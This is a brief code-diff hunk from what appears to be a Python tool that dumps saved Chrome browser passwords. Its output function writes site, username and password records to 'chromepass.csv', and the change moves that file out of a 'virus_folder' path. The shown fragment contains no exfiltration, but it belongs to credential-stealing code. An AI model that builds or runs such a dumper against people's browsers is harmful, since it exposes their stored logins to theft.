@@ -175,7 +175,7 @@ def getpath():
 
 def output_csv(info):
     try:
-        with open('C:\virus_folder\chromepass.csv', 'wb') as csv_file:
+        with open('chromepass.csv', 'wb') as csv_file:
             csv_file.write('origin_url,username,p \n'.encode('utf-8'))
             for data in info:
                 csv_file.write(('%s, %s, %s \n' % (data['origin_url'], data[
